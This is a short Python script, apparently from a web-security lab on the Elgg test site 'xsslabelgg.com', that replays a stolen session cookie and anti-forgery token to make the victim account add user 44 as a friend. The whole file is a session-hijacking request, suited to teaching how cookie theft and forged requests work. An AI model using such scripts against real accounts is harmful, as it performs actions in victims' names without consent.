#!/bin/python3
import sys
import requests

def main(cookie, ts, token):
	url = "http://www.xsslabelgg.com/action/friends/add?friend=44&__elgg_ts={0}&__elgg_token={1}".format(ts, token)
	headers = {
		"Accept": "application/json, text/javascript, */*; q=0.01",
	        "Cookie": "Elgg={0}".format(cookie),
	        "Host": "www.xsslabelgg.com",
	        "X-Requested-With": "XMLHttpRequest"
	}
	response = requests.get(url, headers=headers)
	return response

if __name__ == "__main__":
	if len(sys.argv) == 4:
		rs = main(sys.argv[1], sys.argv[2], sys.argv[3])
		print(rs, "\n\n", str(rs.content).replace(',', '\n'))
